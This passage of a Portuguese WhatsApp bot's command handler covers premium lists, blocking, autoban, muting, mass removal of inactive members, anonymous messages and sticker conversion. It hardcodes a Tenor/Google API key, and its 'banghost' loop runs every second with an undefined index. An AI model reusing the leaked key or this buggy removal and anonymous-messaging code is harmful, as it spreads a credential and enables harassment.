bla = premium.includes(num)
if(!bla) return reply("*Este número não está incluso na lista premium..*")  
pesquisar = num
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
aqua.sendMessage(from, {text: ` ${num.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: selo})
} else {
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(!bla) return reply("*Este número não está incluso na lista premium..*")  
pesquisar = mentioned
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
aqua.sendMessage(from, {text: ` @${mentioned.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: selo})
}
break


case 'premiumlist':
if(!isPremium) return reply(enviar.msg.premium)   
tkks = '╭────*「 *PREMIUM USER👑* 」\n'
for (let V of premium) {
tkks += `│+  @${V.split('@')[0]}\n`
}
tkks += `│+ Total : ${premium.length}\n╰──────*「 *${NomeDoBot}* 」*────`
reply(tkks.trim())
break

case 'getquoted':
case 'getinfo':  
case 'get':  
if(!isPremium) return reply(enviar.msg.premium)   
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 3))
break

case 'id':
case 'figuid':
if (!SoDono && !info.key.fromMe) return 
if (isQuotedSticker) {
var figu = info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64");
reply(figu)
}
break

		case 'block': 
		if (!info.key.fromMe && !SoDono) return reply('Precisa ser Dono')
                if (!info.quoted && !text) return reply(`FORMA ERADA`)
		let users = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await aqua.updateBlockStatus(users, 'block')
		reply(` usuário bloqueado no pv`)
	break
        case 'unblock': 
		if (!info.key.fromMe && !SoDono) return reply('Precisa ser Dono')
                if (!info.quoted && !text) return reply(`FORMA ERADA`)
		let userss = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await aqua.updateBlockStatus(userss, 'unblock')
		reply(` usuário desbloqueado no pv`)
	break


case 'autoban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if(isAdeusCara) return reply("Já está ativado.")
var ind = dbids.indexOf(from)
if(isAdeusCara) {
adeuscara[ind].actived = true
} else {
adeuscara.push({
groupId: from,
actived: true,
number: []
})
}
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Ativou com sucesso o recurso de autoban neste grupo✔️`)
} else if (Number(args[0]) === 0) {
if(!isAdeusCara) return reply("Já está Desativado.")  
var ind = dbids.indexOf(from)		
if(isAdeusCara) {
adeuscara[ind].actived = false
} else {
adeuscara.push({
groupId: from,
actived: false,
number: []
})
}
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Desativou com sucesso o recurso de autoban neste grupo✔️`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'listban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum Número não foi adicionado*')
teks = '*Números que vou moer na porrada se voltar ??:*\n'
for(i=0;i<adeuscara[ind].number.length;++i) {
teks += `➤ *${adeuscara[ind].number[i]}*\n`
}
teks += '*Esses ai vou descer meu martelo do ban 🥵*'
reply(teks)
break  


case 'listagp':
try {
if (!SoDono) return reply(enviar.msg.donosmt)
let getGroups = await aqua.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
if(q.includes("-l") || q.includes("--list")) {
array_gps = [];
for(let a of groups) {
try {
array_gps.push({
title: `‍𝗡𝗼𝗺𝗲: ${a.subject}`,
description: `𝗜𝗱: ${a.id}\n𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}`,
rowId: `${prefix + command} ${a.id}`
})
} catch {}
}
buttonmessage02 = {
title: `Lista de grupos`,
text: `Selecione um grupo para mais detalhes`,
buttonText: "Selecionar",
sections: [
            {
                rows: array_gps
            }
           ]
}
aqua.sendMessage(from, buttonmessage02, {quoted: selo})
} else if (q && args[0].endsWith("g.us")) {
try {
let infogp = await aqua.groupMetadata(`${args[0]}`)
try {
ppUrl = await aqua.profilePictureUrl(`${args[0]}`, 'image')
} catch { ppUrl = "https://telegra.ph/file/41634a68c48c40189dbf7.jpg" }
try {
linkgc = await aqua.groupInviteCode(infogp.id)
linkgp = 'https://chat.whatsapp.com/'+linkgc
} catch { linkgp = "Bot não é admin" }
txt = 
`𝗡𝗼𝗺𝗲 𝗱𝗼 𝗴𝗿𝘂𝗽𝗼: ${infogp.subject}
𝗗𝗼𝗻𝗼: ${infogp.owner ? infogp.owner : "Não tem"}
𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${infogp.participants.length}
𝗜𝗱: ${infogp.id}
𝗟𝗶𝗻𝗸: ${linkgp}
`
await aqua.sendMessage(from, {image: {url: ppUrl}, caption: txt, thumbnail: null, mentions: [sender]}, {quoted: selo})
} catch {}
} else {
txt = "━━━━━━━━━━━━━━━━━━\n"
array_owners = [];
for(let a of groups) {
txt += `𝗡𝗼𝗺𝗲 𝗱𝗼 𝗴𝗿𝘂𝗽𝗼: ${a.subject}
𝗗𝗼𝗻𝗼 / 𝗰𝗿𝗶𝗮𝗱𝗼𝗿: @${a.owner ? a.owner.split("@")[0] : "Não tem"}
𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}
𝗜𝗱: ${a.id}\n━━━━━━━━━━━━━━━━━━\n
`
if(a.owner !== undefined) {
array_owners.push(`${a.owner}`)
}
}
aqua.sendMessage(from, {text: txt, mentions: array_owners})
}
} catch {
reply("Hmm deu erro")
}
break


case 'b':
case 'addautorm':
case 'addautoban':
case 'listanegra':  
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Cade o número?')
var ind = dbids.indexOf(from)
if(isAdeusCara) {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")  
var numind = adeuscara[ind].number.indexOf(listng)
if(numind >= 0) return reply('*Esse Número ja esta incluso*')
adeuscara[ind].number.push(listng)
} else {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")    
adeuscara.push({
groupId: from,
actived: false,
number: [listng]
})
}
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*Número adicionado a lista de autoban*`)
break

case 'delremover':
case 'delautorm':  
case 'delautoban': 
case 'tirardalista':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Diga o numero sem espaço, + ou traço')
if (isNaN(args[0])) return reply('Diga o numero sem espaço, + ou traço')
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum Número não foi adicionado*')
var numind = adeuscara[ind].number.indexOf(args[0])
if(numind < 0) return reply('*Esse número não está incluso*')
adeuscara[ind].number.splice(numind, 1)
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*Número removido a lista de autoban*`)
break

case 'mutados':
                    var ind = GroupsMutedActived.indexOf(from)
                    teks = '*[🔇]  MUTADO [🔇]*\n\n'
                    for (let _ of muted[ind].numbers) {
                        teks += `┠➥ *[🙊]:* @${_.split('@')[0]}\n`
                    }
                    teks += '\n\n┠➥ *[⚠️]* Caso Envie Mensagem, Sera Automaticamente Removido'
                    reply(teks)
                    break


                case 'mute':
                    if(!isGroup) return reply(mess.only.group)
                    if(!isGroupAdmins) return reply(mess.only.admin)
                    if(!isBotGroupAdmins) return reply(mess.only.Badmin)
                    if(args.length < 1) return reply('*[🗣️] Marque o @ De Quem Voce Quer Mutar*')
                    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Marque o n�mero que deseja mutar*')
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    if(isMuted) {
                        var ind = GroupsMutedActived.indexOf(from)
                        teks = '[🔇]  MUTADO [🔇]\n\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Olá:* @${_.split('@')[0]}\n`
                            muted[ind].numbers.push(_)
                        }
                        fs.writeFileSync('./funções de cmd/grupos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks += `\n\n┠➥ *[🙊]:* Voce Foi Mutado Pelo ADM: ${pushname}\nSe Voce Falar Algo, Irei Te Remover 😡`
                        mentions(teks, mentioned, true)
                    } else {
                        const data = {
                            jid: from,
                            numbers: mentioned
                        }
                        muted.push(data)
                        fs.writeFileSync('./funções de cmd/grupos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks = '[🔇]  MUTADO [🔇]\n\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Olá:* @${_.split('@')[0]}\n`
                        }
                        teks += `\n\n┠➥ *[🙊]:* Voce Foi Mutado Pelo ADM: ${pushname}\nSe Voce Falar Algo, Irei Te Remover 😡`
                        mentions(teks, mentioned, true)
                    }
                    break

                case 'desmute':
                    if(!isGroup) return reply(mess.only.group)
                    if(!isGroupAdmins) return reply(mess.only.admin)
                    if(!isBotGroupAdmins) return reply(mess.only.Badmin)
                    if(args.length < 1) return reply('*[🗣️] Marque o @ De Quem Voce Quer Desmutar*')
                    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Marque o n�mero que deseja desmutar*')
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    var ind = GroupsMutedActived.indexOf(from)
                    if(isMuted) {
                        for(let _ of mentioned) {
                            if(muted[ind].numbers.indexOf(_) >= 0) {
                                var rmind = muted[ind].numbers.indexOf(_)
                                muted[ind].numbers.splice(rmind, 1)
                            }
                        }
                        fs.writeFileSync('./funções de cmd/grupos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks = '*[🗣️] DESMUTADO [🗣️]*\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Olá:* @${_.split('@')[0]}\n\n`
                        }
                        teks += `O ADM: ${pushname}, Desmutou Você\nAgora Você Pode Falar.`
                        mentions(teks, mentioned, true)
                    } else {
                        const data = {
                            jid: from,
                            numbers: []
                        }
                        muted.push(data)
                        fs.writeFileSync('./funções de cmd/grupos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks = '*[🗣️] DESMUTADO [🗣️]*\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Olá:* @${_.split('@')[0]}\n\n`
                        }
                        teks += `O ADM: ${pushname}, Desmutou Você\nAgora Você Pode Falar.`
                        mentions(teks, mentioned, true)
                    }
                    break

case 'banghost':
case 'banghosts':  
if(!isGroup) return reply(enviar.msg.grupo)  
if(!SoDono) return reply("Só dono pode executar este comando..")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta função.')
if(q.length < 1) return reply(`Exemplo: ${prefix}banghosts 0\n\nEle vai banir todos aqueles que tá com 0 mensagens, mas faça isso apenas se passou um tempo com o bot armazenando mensagem dos membros ativos do grupo.`)
async function banghst() {
if(groupIdscount.indexOf(from) >= 0) {
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) { 
var indnum = numbersIds.indexOf(obj.id)
if(countMessage[ind].numbers[indnum].messages <= args[0]) {
if(groupAdmins.includes(obj.id)) return mentions(`@${obj.id} ta liberado da inspeção por ser admin`, [obj.id], true)
if(numerodono.includes(obj.id)) return mentions(`@${obj.id} ta liberado da inspeção por ser dono`, [obj.id], true)
aqua.groupParticipantsUpdate(from, [obj.id], 'remove')
}
}
}
}
}
setInterval(banghst, 1000)
break

case 'convite':
if(!budy.includes("chat.whatsapp.com")) return reply("Cadê o link do grupo que você deseja que eu entre?")
cnvt = args.join(" ")
reply(`O convite para o bot entrar em seu grupo, foi enviado, espere o dono aceitar..`)
sendBtext(`${numerodonoa}@s.whatsapp.net`,`?? Convite para entrar em um Grupo\n\nLink : ${cnvt}\n\nNúmero dele(a) : wa.me/${sender.split("@")[0]}`, `${NomeDoBot}️`, [
{buttonId: `${prefix}entrar ${cnvt}`, buttonText: {displayText: `Aceitar`}, type: 1},
{buttonId: `${prefix}recusar ${sender}`, buttonText: {displayText: `Recusar`}, type: 1}], selo)
break

case 'recusar':
if(!SoDono) return reply("Só dono...")
aqua.sendMessage(q, {text: `Olá Amigo(a), sinto muito dizer, mas seu convite foi recusado 🥺`})
break

case 'join':
case 'entrar':
if (!SoDono) return reply(enviar.msg.donosmt)
if (!q) return reply('Coloque o link')
if (!isUrl(args[0]) || !args[0].includes('whatsapp.com')) return reply("Link inválido")
try {
let result = args[0].split('chat.whatsapp.com/')[1]
await aqua.groupAcceptInvite(result)
reply('Prontinho, fiz o que você pediu')
} catch(erro) {
if(String(erro).includes("resource-limit")) {
reply("O bot não pode entrar nesse grupo porque ele está lotado")
} else if(String(erro).includes("not-authorized")) {
reply("O bot não pode entrar nesse grupo porque ele foi removido")
} else if(String(erro).includes("gone")){
reply("O bot não pode entrar nesse grupo porque o link foi redefinido")
} else if(String(erro).includes("not-acceptable")) {
reply("Esse grupo não existe")
} else {
reply("Hmm não consegui entrar no grupo")
}
}
break

case 'correio':
if(!isPremium) return reply(enviar.msg.premium)
{
txt = args.join(" ")
if(!txt) return reply(`Exemplo: ${prefix + command} +55 00.../Oi amor, sdds`)
let txt1 = txt.split("/")[0].replace(/\D/g,'');
let txt2 = txt.split("/")[1];
if(!txt1) return reply('Cade o número da pessoa?')
if(!txt2) return reply('Cade a mensagem do correio??')
let [result] = await aqua.onWhatsApp(txt1)
if(!result) return reply(`Número inválido`)
bla = 
`╭┄━┄━┄━┄━┄━╮
┞┧ ⸙. ͎۪۫          💌  ː͡₊ꞋꞌꞋꞌ
┞┧Correio anônimo. 
┞┧Msg: ${txt2}
┞┧
╰┄━┄━┄━┄━┄━╮`
aqua.sendMessage(result.jid, {text: bla})
reply(`Mensagem enviada com sucesso para wa.me/${result.jid.split("@")[0]}`)
}
break
//==============LEGENDAS=============

case 'legendabv2':  
if(!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if(!isGroupAdmins) return reply(`Só ADM pode utilizar este comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
teks = body.slice(12)
if(isWelcomed2) {
var ind = groupIdWelcomed2.indexOf(from)
welcome_group2[ind].msg = teks
fs.writeFileSync('./funções de cmd/funções/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
welcome_group2.push(json)
fs.writeFileSync('./funções de cmd/funções/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 criada com sucesso!*')
}
break


case 'legendasaiu2':
if(!isGroup) return reply(`Só em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return reply(`Só ADM pode utilizar este tipo de Comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de saída*')
teks = body.slice(14)
if(isByed2) {
var ind = groupIdBye.indexOf(from)
bye_group2[ind].msg = teks
fs.writeFileSync('./funções de cmd/funções/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de saída2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
bye_group2.push(json)
fs.writeFileSync('./funções de cmd/funções/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de saída2 criada com sucesso!*')
}
break



case 'legenda2': {
    if (!/image/.test(mime)) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} texto1|text2`)
if (!text) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} texto1|text2`)
    aqua.sendMessage(from, { react: { text: `👋`, key: info.key }})      
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let dwnld = await quoted.download()
    let { floNime } = require('./funções/uploader')
    let fatGans = await floNime(dwnld)
    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
    let FaTiH = await aqua.sendImageAsSticker(from, smeme, m, { packname: global.packname, author: global.auhor })
    await fs.unlinkSync(FaTiH)
}
   break
  
case 'legenda': {
    if (!/image/.test(mime)) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} |text2`)
if (!text) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} |text2`)
    aqua.sendMessage(from, { react: { text: `👋`, key: info.key }})      
    atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let dwnld = await quoted.download()
    let { floNime } = require('./funções/uploader')
    let fatGans = await floNime(dwnld)
    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
    let FaTiH = await aqua.sendImageAsSticker(from, smeme, m, { packname: global.packname, author: global.auhor })
    await fs.unlinkSync(FaTiH)
}
   break
   
//========FINAL DAS LEGENDAS=============
   
//=============STICKER============
   

case 'figfundo':
case 'figvideo':
case 'figusemfundo': 
case 'sfundo':  
if(!isQuotedImage) return reply(`Marque uma imagem`)
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
deusa = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
reply(enviar.espere)
buff = await getFileBuffer(deusa, 'image')
bas64 = `data:image/jpeg;base64,${buff.toString('base64')}`
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `${pushname}`
sd = `📍Criado por↓${NomeDoBot}`
dua = typeof anu[1] !== 'undefined' ? anu[1] : `${sd}`
var mantap = await convertSticker(bas64, `${dua}`, `${satu}`)
var sti = new Buffer.from(mantap, 'base64');
aqua.sendMessage(from, {sticker: sti}, {quoted: selo})
} else {
return reply(`So imagem mn -_-`)
}
break

case 'sc':
case 'c':
case 'csticker':
case 'cstiker':
case 'stcirculo':
case 'circlesticker':
try {
if ((isMedia && info.message.imageMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
media = rane
getpunt = getRandom('.png')
inpunt = getRandom('.webp')
exec(`convert -size 200x200 xc:none -fill ${media} -draw "circle 100,100 100,1" ${getpunt} && magick ${getpunt} -quality 50 -define webp:lossless=true ${inpunt}`, async (error) => {
if (error) console.log(error)
await aqua.sendMessage(from, {sticker: fs.readFileSync(inpunt)}, {quoted: selo})
if (fs.existsSync(inpunt)) fs.unlinkSync(inpunt)
if (fs.existsSync(media)) fs.unlinkSync(media)
if (fs.existsSync(getpunt)) fs.unlinkSync(getpunt)
if (fs.existsSync(rane)) fs.unlinkSync(rane)
})
} else {
reply("Apenas imagens")
}
} catch (e) {
console.log(e)
reply("Error")
}
break


case 'sticker':
case 'stick':
case 's':
case 'stickergif':
case 'sgif':
case 'f':
case 'figu':
case 'st':
case 'stk': 
reply(enviar.espere)
{
(async function () {
var legenda = q ? q?.split("/")[0] : `[👤] 𝗖𝗥𝗜𝗔𝗗𝗢𝗥: 
[📲] 𝗡𝗨𝗠𝗘𝗥𝗢: 
[👥] 𝗚𝗥𝗨𝗣𝗢: 
[👑] 𝗗𝗢𝗡𝗢:
[💦] 𝗕𝗢𝗧: `
var autor = q ? q?.split("/")[1] : q?.split("/")[0] ? '' : `[ ${pushname}
[ ${sender.split("@")[0]}
[ ${groupName}
[ ${NickDono}
[ ${NomeDoBot}`
if (isMedia && !info.message.videoMessage || isQuotedImage) {
var encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(rane)
// "android-app-store-link": "https://play.google.com/store/search?q=%2B55%2094%209147-2796%20%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5&c=apps",
var json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
var exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
var jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
var exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = Math.floor(Math.random() * (99999 - 11111 + 1) + 11111)+".temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
aqua.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: selo})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else if (isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 35) {
var encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
await ffmpeg(`./${rane}`)
.inputFormat(rane.split('.')[1])
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(rane)
let json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
let jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
let exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = "temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
aqua.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: selo})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else {
reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
})().catch(e => {
console.log(e)
reply("Hmm deu erro")
try {
if (fs.existsSync("temp.exif")) fs.unlinkSync("temp.exif");
if (fs.existsSync(rano)) fs.unlinkSync(rano);
if (fs.existsSync(media)) fs.unlinkSync(media);
} catch {}
})
}
break
   
   
   
case 'f':   
case 'f': {

if (/image/.test(mime)) {
media = await quoted.download()
let encmedia = await aqua.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.packname2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 40) return reply('Máximo 40 segundo!')
media = await quoted.download()
let encmedia = await aqua.sendVideoAsSticker(from, media, m,  { packname: global.packname, author: global.packname2 })
await fs.unlinkSync(encmedia)
} else {
reply(`Enviar imagem/vídeo com legenda ${prefix + command}\nDuração Video 1/40 segundo`)
}
}
break


case 'emoji': {
if (!args.join(" ")) return reply('CADÊ O EMOJI?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await aqua.sendMessage(from, {image:{url:emoji.images[4].url}, caption:"PRONTO!"}, {quoted: selo})
await aqua.sendMessage(from, {text:`!s`}, {quoted: seloese})
}).catch(e => {
reply("EMOJI NÃO ENCONTRADO, TENTE OUTRO EMOJI AÍ...")
})
}
break


case 'emoji2':     
case 'emoji-mix':
case 'emojimix': {
    if (!q) return reply( `Exemplo : ${prefix + command} 😅+🤔`) 
	reply('SER NÃO FOR TENTA COM OUTRO... ?')
			let [emoji1, emoji2] = q.split`+`
		 anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
	let encmedia = await aqua.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
	await fs.unlinkSync(encmedia)
		}
}
break

case 'rename':
case 'roubar':  
if (!isQuotedSticker) return reply('Marque uma figurinha...')
encmediats = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
var kls = q
var pack = kls.split("/")[0];
var author2 = kls.split("/")[1];
if (!q) return reply('*E o autor e o nome do pacote?*')
if (!pack) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/bla*`)
if (!author2) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/dms*`)
reply(enviar.espere)
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var sti = new Buffer.from(mantap, 'base64');
aqua.sendMessage(from, {sticker: sti, contextInfo: { externalAdReply:{title: `${pack}|${author2}`,body:"", previewType:"PHOTO",thumbnail: sti}}}, {quoted: selo})
.catch((err) => {
reply(`❎ Error, tenta mais tarde`); 
})
break

case 'togif':
if (!isQuotedSticker) return reply('*[ ❗ ] Marque a figurinha animada!*')
if ((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
buff = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
reply('*「 ❗ 」 Aguarde, convertendo a figu em gif...*')
a = await webp_mp4(buff)
mp4 = await getBuffer(a)
aqua.sendMessage(from, {video: mp4, gifPlayback: true, filename: `stick.gif`}, {quoted: selo})
fs.unlinkSync(buff)
}
break

case 'toimg':
if (!isQuotedSticker) return reply('[💧] MARQUE UMA FIGURINHA [💧]')
reply(enviar.espere)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
aqua.sendMessage(from, {image: buff}, {quoted: selo}).catch(e => {
console.log(e);
reply('ERROR!!')
})
break

case 'tomp3':
if ((isMedia && !info.message.imageMessage || isQuotedVideo)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.videoMessage
reply(enviar.espere)
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane 
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => { 
fs.unlinkSync(media)
if (err) return reply('❌ Falha ao converter vídeo para mp3 ❌')
buffer = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: buffer, mimetype: 'audio/mp4'}, {quoted: selo})
fs.unlinkSync(ran)
})
} else {
reply("Marque o vídeo para transformar em áudio por favor..")
}
break

//========FINAL DAS STICKER=============



//==========(TTPS/ATTP/TTM)============\\


case 'attp':
if (args.length == 0) return reply(`Exemplo: ${prefix + command} Sad`)
reply(enviar.espere)
buffer = await getBuffer(`https://tohka.tech/api/maker/attp1?texto=${string}=apikey=${tohkapi}`)
await aqua.sendMessage(from, {sticker: buffer}, {quoted: selo}).catch(e => {
reply('ERROR, ALGUM PROBLEMA NA API, EU ACHO.. ')  
})
break

case 'ttp':
try {
reply(enviar.espere)
string = args.join(' ') || 'Texto indefinido'
post = `https://manuella-api-pl.herokuapp.com/api/ttp?texto=${string}&apikey=${keyapi}`
sendStickerFromUrl(from, post, {quoted: selo})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'attp2':		
case 'attp3': 
case 'attp4':
case 'attp5': 
case 'attp6':  
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
url = await getBuffer(`https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${encodeURI(q)}`)
await aqua.sendMessage(from, {sticker: url}, {quoted: selo})
} catch {
reply('ERROR')
}
break	


//======================================\\


//========COMANDOS DE GRUPO=============

case 'status':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins && !SoDono  && !m.key.fromMe) return reply(enviar.msg.adm)
statuszada =
`╭╼╼╾❲ S T A T U S ❳╼╼╾╮
│➱ Anti áudios: ${isAntiAudio? '✅' : '⛔'}
